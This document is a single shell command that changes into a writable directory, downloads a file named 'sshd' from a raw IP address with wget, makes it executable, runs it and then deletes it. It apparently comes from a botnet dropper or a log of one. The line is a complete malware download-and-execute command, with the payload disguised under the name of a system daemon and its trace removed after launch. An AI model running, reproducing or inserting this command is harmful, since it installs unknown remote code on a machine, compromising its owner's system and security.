cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://172.245.24.233/sshd; chmod +x sshd; ./sshd; rm -rf sshd
